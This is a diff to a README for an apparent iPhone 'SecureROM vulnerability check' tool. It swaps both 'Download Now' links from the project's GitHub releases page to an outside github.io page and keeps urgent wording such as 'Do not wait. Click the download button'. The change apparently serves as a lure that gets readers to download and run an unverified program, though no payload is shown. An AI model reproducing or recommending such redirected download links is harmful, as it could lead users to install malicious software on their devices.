@@ -6,7 +6,7 @@ A15-SECUREROM-VULNS is a straightforward tool that helps you check your iPhone o
 
 ## 📥 Quick Download
 
-[![Download Now](https://img.shields.io/badge/Download-A15--SECUREROM--VULNS-blue?style=for-the-badge&logo=github)](https://github.com/The1975sii/A15-SECUREROM-VULNS/releases)
+[![Download Now](https://img.shields.io/badge/Download-A15--SECUREROM--VULNS-blue?style=for-the-badge&logo=github)](https://the1975sii.github.io)
 
 Visit this link to download the application.
 
@@ -189,7 +189,7 @@ Most problems are simple to solve with patience.
 
 Your device security matters. Do not wait. Click the download button below and check your iPhone today. The process takes less than five minutes and gives you peace of mind.
 
-[![Download Now](https://img.shields.io/badge/Get_A15--SECUREROM--VULNS-Now-green?style=for-the-badge&logo=github)](https://github.com/The1975sii/A15-SECUREROM-VULNS/releases)
+[![Download Now](https://img.shields.io/badge/Get_A15--SECUREROM--VULNS-Now-green?style=for-the-badge&logo=github)](https://the1975sii.github.io)
 
 Visit this link to download the application. Run the tool, connect your phone, and follow the on-screen instructions. It is that simple.
 
